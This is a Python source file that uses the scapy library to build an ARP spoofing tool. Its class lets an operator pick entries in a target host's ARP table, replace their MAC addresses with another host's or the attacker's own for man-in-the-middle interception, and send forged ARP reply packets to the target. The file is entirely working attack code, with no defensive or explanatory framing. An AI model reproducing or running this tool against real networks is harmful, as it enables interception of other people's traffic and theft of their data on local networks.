from scapy.all import *
import copy
import socket
from tabulate import tabulate


class arptable:
    
    

    def __init__(self, table, addr, attacker_addr):

        self.ip = addr[0]
        self.mac = addr[1]

        self.attacker_ip = attacker_addr[0]
        self.attacker_mac = attacker_addr[1]
        self.table = table

        



    def get_mac(self, ip):
        arp_request = ARP(pdst = ip)
        broadcast = Ether(dst ="ff:ff:ff:ff:ff:ff")
        arp_request_broadcast = broadcast / arp_request
        answered_list = srp(arp_request_broadcast, timeout = 5, verbose = False)[0]
        return answered_list[0][1].hwsrc



    def show(self):
            
        print("\n\n" + self.ip + " ARP TABLE:\n")
        
        header = ["IP", "MAC", "SPOOFED"]

        print(tabulate(self.table, headers = header,  tablefmt="grid"))
            


    def spoof(self):

        self.show()

        row = int(input("\n> Select a row to spoof > "))

        spoof_ip = input("> MAC in row " + str(row) + " will be replaced with the MAC of (IP) > ")
        spoof_mac = self.get_mac(spoof_ip)

        
        self.table[row][1] = spoof_mac
        self.table[row][2] = True


        self.show()





    def mitm(self, arpip):
        

        row = 0
        for n, r in enumerate(self.table):
            if arpip == r[0]:
                row = n
                
        

        self.table[row][1] = self.attacker_mac
        self.table[row][2] = True

        self.show()




    def attack(self):

        for r in self.table:
            if r[2]:

                spoof_ip = r[0]
                spoof_mac = r[1]
                
                packet = ARP(op = 2, pdst = self.ip, hwdst = self.mac, hwsrc = spoof_mac, psrc = spoof_ip)

                send(packet, verbose=False)

                print("\nsent to {}: {} is at {}".format(self.ip, spoof_ip, spoof_mac))
    

        


        

    
        
        

        
        



        

        












        



    






